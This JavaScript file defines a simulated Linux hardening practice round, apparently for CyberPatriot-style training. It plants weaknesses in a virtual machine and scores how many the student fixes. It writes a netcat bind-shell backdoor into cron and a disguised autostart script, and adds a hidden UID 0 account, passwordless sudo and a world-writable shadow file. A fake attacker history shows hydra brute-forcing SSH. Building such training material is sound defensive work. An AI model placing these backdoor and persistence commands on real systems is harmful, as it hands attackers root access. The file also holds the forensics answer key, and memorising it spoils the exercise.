// Scenario: "Ubuntu Practice Round 1" — 100 points. See docs/scenarios.md for how to write one.
import { buildUbuntu22 } from '../../images/mint21.js';
import * as users from '../../core/users.js';
import * as pk from '../../core/packages.js';
import * as sv from '../../core/services.js';
import { ufwActive } from '../../core/firewall.js';
import { compareVersions } from '../../core/util.js';
import * as K from '../../core/checks.js';
import { readmeHtml, AUTHORIZED_ADMINS, AUTHORIZED_USERS, NEW_HIRE } from './readme.js';

const STUDENT = AUTHORIZED_ADMINS[0];
const DANA = AUTHORIZED_ADMINS[1];

const b64 = (s) => (typeof btoa === 'function' ? btoa(s) : Buffer.from(s).toString('base64'));

function put(sys, owner, path, data, { mode = 0o644, size, mtimeDaysAgo = 3 } = {}) {
  const u = users.getUser(sys, owner);
  const dir = path.slice(0, path.lastIndexOf('/'));
  if (!sys.vfs.exists(dir)) sys.vfs.mkdir(dir, { parents: true, mode: 0o755, uid: u.uid, gid: u.gid });
  const n = sys.vfs.writeFile(path, data, { mode, uid: u.uid, gid: u.gid, mtime: sys.now() - mtimeDaysAgo * 86400000 });
  if (size != null) n.size = size;
  return n;
}

function replaceInFile(sys, path, re, to) {
  const t = sys.vfs.readFile(path);
  if (!re.test(t)) throw new Error(`scenario: pattern ${re} not found in ${path}`);
  sys.vfs.writeFile(path, t.replace(re, to));
}

const FQ = [
  { n: 1, answer: 'Lighthouse-8802', text: 'A user left a note somewhere in /home with the admin password for the library staff Wi-Fi.\nWhat is that password?' },
  { n: 2, answer: 'MAPLE-SYRUP-93', text: 'The file /home/lena/Documents/message.b64 holds a Base64-encoded message.\nDecode it. What is the secret codeword?' },
];

function apply(sys) {
  const v = sys.vfs;

  // ---- accounts -------------------------------------------------------------------------
  users.setPassword(sys, 'student', STUDENT.password);
  const add = (name, uid, pw, groups = [], gecos = '') => users.userAdd(sys, { name, uid, password: pw, groups, gecos: gecos || `${name[0].toUpperCase()}${name.slice(1)},,,` });
  add('sam', 1001, DANA.password, ['cdrom', 'plugdev'], 'Sam Okafor,,,');
  add('lena', 1002, 'Quartz&River77', [], 'Lena Voss,,,');
  add('omar', 1003, 'Bl@ckHorse!42', [], 'Omar Haddad,,,');
  add('priya', 1004, 'priya123', [], 'Priya Nair,,,');
  add('tyrone', 1005, 'tyrone', [], 'Tyrone Banks,,,');
  add('hana', 1006, 'Hana$Lake2026', ['sudo', 'adm'], 'Hana Sato,,,');
  add('pentest', 1007, 'pentest', ['sudo'], 'pen test,,,');
  add('h4x0r', 1008, 'h4x0r', ['sudo'], 'h4x0r,,,');
  users.userAdd(sys, { name: 'sysadm', uid: 0, gid: 0, nonUnique: true, home: '/root', createHome: false, shell: '/bin/bash', password: 'sysadm', gecos: 'sysadm' });
  sys.misc.initialHashes = {};
  for (const n of ['priya', 'tyrone']) sys.misc.initialHashes[n] = users.getShadow(sys, n).hash;
  // password-aging fields the way a fresh install would have them
  for (const u of ['student', 'sam', 'lena', 'omar', 'priya', 'tyrone', 'hana', 'pentest', 'h4x0r']) users.chage(sys, u, { max: 99999 });

  // ---- software and services -----------------------------------------------------------
  pk.installPackage(sys, 'apache2');
  pk.installPackage(sys, 'samba');
  pk.installPackage(sys, 'hydra');
  pk.installPackage(sys, 'aisleriot');
  pk.installPackage(sys, 'ophcrack');
  pk.installPackage(sys, 'nmap');

  // ---- configuration mistakes ------------------------------------------------------------
  v.writeFile('/etc/sudoers.d/99-wheel-nopasswd', '# Created by a contractor "to make scripts easier"\n%sudo ALL=(ALL) NOPASSWD: ALL\n', { mode: 0o440, uid: 0, gid: 0 });
  replaceInFile(sys, '/etc/gdm3/custom.conf', /^#\s*AutomaticLoginEnable = true$/m, 'AutomaticLoginEnable = true');
  replaceInFile(sys, '/etc/gdm3/custom.conf', /^#\s*AutomaticLogin = user1$/m, 'AutomaticLogin = student');
  replaceInFile(sys, '/etc/pam.d/common-password', /pam_pwquality\.so retry=3/, 'pam_pwquality.so retry=3 minlen=4');
  replaceInFile(sys, '/etc/ssh/sshd_config', /^#PermitRootLogin .*$/m, 'PermitRootLogin yes');
  v.writeFile('/etc/ssh/sshd_config.d/99-local.conf', '# local overrides\nPermitEmptyPasswords yes\n', { mode: 0o644, uid: 0, gid: 0 });
  v.writeFile('/etc/sysctl.conf', v.readFile('/etc/sysctl.conf').replace(/\n*$/, '\n') + '\n# tuning\nnet.ipv4.tcp_syncookies=0\n');
  sys.sysctl['net.ipv4.tcp_syncookies'] = '0';
  v.writeFile('/etc/apt/apt.conf.d/10periodic', 'APT::Periodic::Update-Package-Lists "0";\nAPT::Periodic::Download-Upgradeable-Packages "0";\nAPT::Periodic::AutocleanInterval "0";\n');
  v.chmod('/etc/shadow', 0o666);

  // ---- malware and persistence -----------------------------------------------------------
  const ncCmd = '/bin/nc.traditional -l -p 31337 -e /bin/bash';
  v.writeFile('/etc/cron.d/popularity-sync', `# popularity sync\nSHELL=/bin/sh\n* * * * * root ${ncCmd} >/dev/null 2>&1 &\n`, { mode: 0o644, uid: 0, gid: 0 });
  const bd = { user: 'root', cmd: ncCmd, comm: 'nc.traditional', stat: 'S', listen: [{ proto: 'tcp', addr: '0.0.0.0', port: 31337 }] };
  sys.respawn.push({ id: 'backdoor31337', match: 'nc.traditional -l -p 31337', proc: bd });
  sys.spawn({ ...bd, respawnId: 'backdoor31337' });
  sys.spawn({ user: 'zerocool', cmd: 'python3 -m http.server 8080', comm: 'python3', tty: 'pts/1', stat: 'Sl', listen: [{ proto: 'tcp', addr: '0.0.0.0', port: 8080 }] });
  put(sys, 'student', '/home/student/.config/autostart/gnome-update-helper.desktop', '[Desktop Entry]\nType=Application\nName=GNOME Update Helper\nComment=Checks for system updates\nExec=/usr/local/bin/.updatehelper\nX-GNOME-Autostart-enabled=true\nNoDisplay=false\n');
  v.writeFile('/usr/local/bin/.updatehelper', '#!/bin/sh\n# phone home\nsleep 30 && /bin/nc.traditional -l -p 31337 -e /bin/bash &\n', { mode: 0o755, uid: 0, gid: 0 });

  // ---- prohibited files, evidence and decoys -----------------------------------------------
  put(sys, 'priya', '/home/priya/Music/summer_mix.mp3', 'ID3\u0003\u0000\u0000\u0000\u0000\u0000(simulated mp3 data)', { size: 7132412 });
  put(sys, 'lena', '/home/lena/Videos/movie_night.mp4', '\u0000\u0000\u0000\u0018ftypmp42(simulated video data)', { size: 48713220 });
  put(sys, 'tyrone', '/home/tyrone/Documents/passwords.txt', 'MY PASSWORDS (do not share!!)\n\nemail:    tyrone.banks@harborlane.example / tyrone2019\nbank:     hunter22\nwifi:     ApexGuest!2024\nvpn:      morgan / Winter#Is#Coming\n');
  put(sys, 'omar', '/home/omar/Documents/old/wifi_notes.txt', 'Library staff Wi-Fi notes\n-------------------------\nSSID:  HarborLane-Staff\nadmin: staffadmin\npass:  Lighthouse-8802\n\nTODO: move this into the password manager and delete this file.\n');
  put(sys, 'omar', '/home/omar/Documents/lunch_order.txt', 'Tuesday: pad thai\nWednesday: tacos\nFriday: pizza (team meeting)\n');
  put(sys, 'lena', '/home/lena/Documents/message.b64', b64('The secret codeword is: MAPLE-SYRUP-93\n') + '\n');
  put(sys, 'lena', '/home/lena/Documents/shopping.txt', 'milk\neggs\nlaminating sheets\n');
  put(sys, 'priya', '/home/priya/Documents/event_plan.txt', 'Summer reading kickoff: June 3.\nNeed 40 folding chairs.\n');
  put(sys, 'pentest', '/home/pentest/.bash_history', 'ls\nnmap -sV 10.0.2.0/24\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.2\nsudo useradd -o -u 0 -g 0 sysadm\ncrontab -l\nnc.traditional -l -p 31337 -e /bin/bash\nsudo chmod 666 /etc/shadow\nexit\n');
  put(sys, 'h4x0r', '/home/h4x0r/notes.txt', 'serving files from the box on :8080, no one will notice\n');
  put(sys, 'hana', '/home/hana/Documents/budget.csv', 'item,cost\nbooks,420\nshelving,310\n');

  // ---- the competitor's desktop -----------------------------------------------------------
  const desk = '/home/student/Desktop';
  v.mkdir('/opt/CyberPatriot', { parents: true, mode: 0o755 });
  v.writeFile('/opt/CyberPatriot/README.html', readmeHtml(), { mode: 0o644, uid: 0, gid: 0 });
  v.writeFile('/opt/CyberPatriot/ScoringReport.html', '<html><body>Scoring report (live; open it from the Desktop shortcut)</body></html>', { mode: 0o644, uid: 0, gid: 0 });
  put(sys, 'student', `${desk}/Scenario README.desktop`, '[Desktop Entry]\nType=Application\nName=Scenario README\nExec=firefox file:///opt/CyberPatriot/README.html\nIcon=cyberpatriot\nTerminal=false\n', { mode: 0o755 });
  put(sys, 'student', `${desk}/Scoring Report.desktop`, '[Desktop Entry]\nType=Application\nName=Scoring Report\nExec=firefox file:///opt/CyberPatriot/ScoringReport.html\nIcon=cyberpatriot\nTerminal=false\n', { mode: 0o755 });
  for (const q of FQ) {
    put(sys, 'student', `${desk}/Forensics Question ${q.n}.txt`, `FORENSICS QUESTION ${q.n}\n\n${q.text}\n\nType your answer after "ANSWER:" below and save this file.\n\nANSWER: \n`, { mode: 0o644 });
  }
  put(sys, 'student', '/home/student/.bash_history', '');
  sys.dirty = false;
}

// ---------------------------------------------------------------- scoring definitions
const fq = (q) => ({
  id: `fq${q.n}`, category: 'Forensics', points: 6, title: `Forensics Question ${q.n} correct`,
  check: (sys) => K.answerOf(sys, `/home/student/Desktop/Forensics Question ${q.n}.txt`).toLowerCase() === q.answer.toLowerCase(),
});

const gone = (id, path, title, pts, category = 'Prohibited Files') => ({ id, category, points: pts, title, check: (s) => !s.vfs.exists(path) });

export const vulns = [
  fq(FQ[0]), fq(FQ[1]),
  { id: 'rm-pentest', category: 'User Auditing', points: 3, title: 'Removed unauthorized user pentest', check: (s) => !users.getUser(s, 'pentest') },
  { id: 'rm-h4x0r', category: 'User Auditing', points: 3, title: 'Removed unauthorized user h4x0r', check: (s) => !users.getUser(s, 'h4x0r') },
  { id: 'rm-sysadm', category: 'User Auditing', points: 3, title: 'Removed hidden UID 0 account sysadm', check: (s) => !users.getUser(s, 'sysadm') },
  { id: 'hana-std', category: 'User Auditing', points: 3, title: 'User hana is not an administrator', check: (s) => !!users.getUser(s, 'hana') && !users.isAdmin(s, 'hana') },
  { id: 'sam-admin', category: 'User Auditing', points: 3, title: 'User sam is an administrator', check: (s) => !!users.getUser(s, 'sam') && users.isAdmin(s, 'sam') },
  { id: 'pw-priya', category: 'User Auditing', points: 2, title: 'Changed insecure password for user priya', check: (s) => !!users.getUser(s, 'priya') && K.passwordIsSecure(s, 'priya') },
  { id: 'pw-tyrone', category: 'User Auditing', points: 2, title: 'Changed insecure password for user tyrone', check: (s) => !!users.getUser(s, 'tyrone') && K.passwordIsSecure(s, 'tyrone') },
  { id: 'add-nadia', category: 'User Auditing', points: 3, title: 'Created user account for new hire nadia', check: (s) => K.standardUserExists(s, NEW_HIRE) },
  { id: 'expire-omar', category: 'User Auditing', points: 2, title: 'User omar must change password at next login', check: (s) => !!users.getUser(s, 'omar') && K.mustChangePassword(s, 'omar') },
  { id: 'autologin-off', category: 'Account Policy', points: 3, title: 'Automatic login is disabled', check: (s) => !K.autologinUser(s) },
  { id: 'max-days', category: 'Account Policy', points: 2, title: 'A maximum password age is set (90 days or less)', check: (s) => { const n = Number(K.loginDefs(s).PASS_MAX_DAYS); return n >= 1 && n <= 90; } },
  { id: 'min-len', category: 'Account Policy', points: 2, title: 'A minimum password length of 10 or more is required', check: (s) => K.effectiveMinLen(s) >= 10 },
  { id: 'lockout', category: 'Account Policy', points: 2, title: 'An account lockout policy is configured', check: (s) => { const d = K.lockoutDeny(s); return d != null && d >= 1 && d <= 10; } },
  { id: 'nullok', category: 'Account Policy', points: 2, title: 'Empty passwords no longer authenticate', check: (s) => !K.nullokPresent(s) },
  { id: 'sudo-auth', category: 'Account Policy', points: 3, title: 'sudo requires a password', check: (s) => !K.sudoNeedsNoPassword(s) },
  { id: 'ufw', category: 'Defensive Countermeasures', points: 3, title: 'Firewall protection has been enabled', check: (s) => ufwActive(s) },
  { id: 'auto-upd', category: 'Defensive Countermeasures', points: 2, title: 'Automatic checking for updates is enabled', check: (s) => K.aptPeriodic(s, 'Update-Package-Lists') >= 1 },
  { id: 'upd-firefox', category: 'Defensive Countermeasures', points: 2, title: 'Firefox has been updated', check: (s) => pk.isInstalled(s, 'firefox') && compareVersions(pk.installedVersion(s, 'firefox'), pk.def('firefox').avail) >= 0 },
  { id: 'sec-updates', category: 'Defensive Countermeasures', points: 3, title: 'Security updates for OpenSSL have been installed', check: (s) => K.upToDate(s, ['openssl', 'libssl3']) },
  { id: 'ssh-root', category: 'Application Security', points: 3, title: 'SSH root login has been disabled', check: (s) => ['no', 'prohibit-password', 'without-password', 'forced-commands-only'].includes(K.sshdValue(s, 'PermitRootLogin')) && pk.isInstalled(s, 'openssh-server') },
  { id: 'ssh-empty', category: 'Application Security', points: 2, title: 'SSH does not permit empty passwords', check: (s) => K.sshdValue(s, 'PermitEmptyPasswords') === 'no' && pk.isInstalled(s, 'openssh-server') },
  { id: 'syncookies', category: 'Application Security', points: 2, title: 'IPv4 TCP SYN cookies have been enabled', check: (s) => K.sysctlConfValue(s, 'net.ipv4.tcp_syncookies') === '1' },
  { id: 'ff-popups', category: 'Application Security', points: 2, title: 'Firefox blocks pop-up windows', check: (s) => pk.isInstalled(s, 'firefox') && K.firefoxPopupsBlocked(s) },
  { id: 'ff-safebrowsing', category: 'Application Security', points: 2, title: 'Firefox blocks dangerous and deceptive content', check: (s) => pk.isInstalled(s, 'firefox') && K.firefoxSafeBrowsing(s) },
  { id: 'ff-downloads', category: 'Application Security', points: 2, title: 'Firefox blocks dangerous downloads', check: (s) => pk.isInstalled(s, 'firefox') && K.firefoxDownloadsProtected(s) },
  { id: 'apache-off', category: 'Service Auditing', points: 3, title: 'Apache2 service has been disabled or removed', check: (s) => K.serviceOff(s, 'apache2', 'apache2') },
  { id: 'smb-off', category: 'Service Auditing', points: 3, title: 'Samba service has been disabled or removed', check: (s) => K.serviceOff(s, 'smbd', 'samba') && K.serviceOff(s, 'nmbd', 'samba') },
  { id: 'rm-hydra', category: 'Prohibited Software', points: 2, title: 'Prohibited software THC Hydra removed', check: (s) => !pk.isInstalled(s, 'hydra') },
  { id: 'rm-aisleriot', category: 'Prohibited Software', points: 2, title: 'Prohibited software AisleRiot Solitaire removed', check: (s) => !pk.isInstalled(s, 'aisleriot') },
  { id: 'rm-ophcrack', category: 'Prohibited Software', points: 2, title: 'Prohibited software Ophcrack removed', check: (s) => !pk.isInstalled(s, 'ophcrack') },
  { id: 'rm-nmap', category: 'Prohibited Software', points: 2, title: 'Prohibited software Nmap removed', check: (s) => !pk.isInstalled(s, 'nmap') },
  { id: 'rm-media', category: 'Prohibited Files', points: 2, title: 'Removed prohibited media files', check: (s) => !s.vfs.exists('/home/priya/Music/summer_mix.mp3') && !s.vfs.exists('/home/lena/Videos/movie_night.mp4') },
  gone('rm-passwords', '/home/tyrone/Documents/passwords.txt', 'Removed plaintext password file', 2),
  { id: 'shadow-perms', category: 'Malware', points: 3, title: 'Insecure permissions on /etc/shadow fixed', check: (s) => { const m = K.fileMode(s, '/etc/shadow'); return m != null && (m & ~0o640) === 0; } },
  gone('rm-cron-bd', '/etc/cron.d/popularity-sync', 'Removed backdoor cron job', 2, 'Malware'),
  { id: 'bd-listener', category: 'Malware', points: 2, title: 'Stopped backdoor listening on port 31337', check: (s) => !K.portListening(s, 31337) },
  { id: 'rm-autostart', category: 'Malware', points: 2, title: 'Removed malicious startup entry', check: (s) => !s.vfs.exists('/home/student/.config/autostart/gnome-update-helper.desktop') },
];

export const penalties = [
  ...[STUDENT.name, DANA.name, ...AUTHORIZED_USERS].map((name) => ({ id: `auth-${name}`, points: 5, title: `Authorized user ${name} was removed`, check: (s) => !users.getUser(s, name) })),
  { id: 'student-sudo', points: 5, title: 'Authorized administrator student lost administrator rights', check: (s) => !!users.getUser(s, 'student') && !users.isAdmin(s, 'student') },
  { id: 'ssh-crit', points: 5, title: 'Critical service OpenSSH is stopped, disabled or removed', check: (s) => !pk.isInstalled(s, 'openssh-server') || !sv.isActive(s, 'ssh') || !sv.isEnabled(s, 'ssh') },
  { id: 'firefox-crit', points: 5, title: 'Required program Firefox was removed', check: (s) => !pk.isInstalled(s, 'firefox') },
];

export default {
  id: 'ubuntu-round1',
  title: 'Ubuntu Practice Round 1',
  image: 'ubuntu22',
  imageName: 'Ubuntu 22.04.5 LTS',
  teamId: 'UBU2-2R01-PRAC',
  user: 'student',
  password: STUDENT.password,
  readmeHtml,
  vulns,
  penalties,
  forensics: FQ,
  createMachine(opts) {
    const sys = buildUbuntu22(opts);
    apply(sys);
    return sys;
  },
};
